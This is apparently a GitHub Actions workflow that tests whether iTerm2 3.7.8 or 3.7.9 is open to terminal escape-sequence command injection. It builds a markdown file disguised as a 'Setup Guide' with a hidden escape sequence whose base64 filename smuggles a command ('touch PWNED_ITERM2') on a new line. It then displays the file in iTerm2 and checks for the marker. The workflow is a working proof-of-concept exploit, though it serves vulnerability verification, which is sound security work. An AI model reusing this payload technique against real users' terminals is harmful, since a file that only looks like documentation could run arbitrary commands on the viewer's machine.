name: iterm2-verify

on:
  workflow_dispatch:
    inputs:
      version:
        description: 'iTerm2 version (3.7.8 vulnerable, 3.7.9 fixed)'
        required: true
        default: '3.7.8'
      mode:
        description: 'Drive mode'
        required: true
        default: 'osascript'
        type: choice
        options:
          - osascript
          - direct

jobs:
  verify:
    runs-on: macos-13
    timeout-minutes: 25

    steps:
      - name: Environment
        run: |
          echo "=== System ==="
          sw_vers
          uname -a
          echo ""
          echo "=== Console user ==="
          stat -f%Su /dev/console
          echo ""
          echo "=== WindowServer ==="
          pgrep -l WindowServer || echo "no WindowServer"

      - name: Download iTerm2
        env:
          VER: ${{ inputs.version }}
        run: |
          set -eux
          V=$(echo "$VER" | tr '.' '_')
          URL="https://iterm2.com/downloads/stable/iTerm2-${V}.zip"
          curl -L --max-time 300 -o /tmp/i.zip "$URL"
          ls -la /tmp/i.zip
          unzip -q /tmp/i.zip -d /tmp/i
          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /tmp/i/iTerm.app/Contents/Info.plist

      - name: Check binary symbols
        run: |
          BIN="/tmp/i/iTerm.app/Contents/MacOS/iTerm2"
          echo "=== fixed symbols (3.7.9 only) ==="
          for sym in it_reportUnsafeControlCharacterSet stringByReplacingControlCharactersWithSpace; do
            C=$(strings -a "$BIN" | grep -c "$sym" || true)
            echo "  $sym = $C"
          done
          echo ""
          echo "=== baseline symbols ==="
          for sym in executeAPC respondToTransmit filenameIsSafe screenSendReportData; do
            C=$(strings -a "$BIN" | grep -c "$sym" || true)
            echo "  $sym = $C"
          done

      - name: Build payload
        run: |
          set -eux
          CMD='touch PWNED_ITERM2'
          FP=$(printf '/tmp/x\n%s\nz' "$CMD")
          B64=$(printf '%s' "$FP" | base64)
          ESC=$(printf '\033')
          printf '# Setup Guide\n\n## Prerequisites\n- Node.js 18+\n%s_Ga=T,f=100,t=f,i=1;%s%s\\\n## Install\nnpm install\n' "$ESC" "$B64" "$ESC" > /tmp/payload.md
          echo "=== size ==="
          wc -c /tmp/payload.md
          echo "=== hexdump ==="
          od -c /tmp/payload.md | head -20

      - name: Clean marker
        run: |
          rm -f "$HOME/PWNED_ITERM2" /tmp/PWNED_ITERM2
          echo cleaned

      - name: Launch iTerm2 and feed payload
        env:
          MODE: ${{ inputs.mode }}
        run: |
          set -x
          open -a /tmp/i/iTerm.app
          sleep 12
          pgrep -l iTerm || echo "iTerm not running"

          cat > /tmp/drive.scpt <<'SCPT'
          tell application "iTerm2"
            activate
            delay 3
            set w to (create window with default profile)
            delay 2
            tell current session of w
              write text "cat /tmp/payload.md"
            end tell
            delay 6
          end tell
          SCPT

          osascript /tmp/drive.scpt 2>&1 || echo "osascript failed"
          sleep 10
          pgrep -l iTerm || echo "iTerm gone"

      - name: Check result
        if: always()
        run: |
          echo "================================================"
          echo "RESULT CHECK"
          echo "================================================"
          FOUND=0
          for f in "$HOME/PWNED_ITERM2" /tmp/PWNED_ITERM2 ./PWNED_ITERM2; do
            if [ -f "$f" ]; then
              echo "[RESULT] VULNERABLE - marker found: $f"
              ls -la "$f"
              FOUND=1
            fi
          done
          if [ "$FOUND" = "0" ]; then
            echo "[RESULT] NOT_EXPLOITED"
            echo ""
            echo "=== pwd ==="
            pwd
            echo "=== HOME ==="
            ls -lat "$HOME" | head -20
            echo "=== /tmp ==="
            ls -lat /tmp | head -20
          fi

      - name: Screenshot
        if: always()
        run: |
          screencapture -x /tmp/screen.png 2>/dev/null && echo "captured" || echo "capture failed"
          ls -la /tmp/screen.png 2>/dev/null || true

      - name: Upload evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: evidence
          path: |
            /tmp/payload.md
            /tmp/screen.png
          if-no-files-found: warn
